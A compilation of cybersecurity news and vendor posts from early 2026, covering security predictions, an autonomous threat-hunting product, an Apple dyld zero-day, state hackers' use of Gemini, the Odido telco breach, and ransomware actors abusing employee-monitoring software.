AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Ransomware crews add 'EDR killers' to their arsenal – and some aren't even malware

Notepad's new Markdown powers served with a side of remote code execution

Payroll pirates are conning help desks to steal workers' identities and redirect paychecks

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Stalkerware slinger pleads guilty for selling snooper software to suspicious spouses

Apple, Google forced to issue emergency 0-day patches

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®
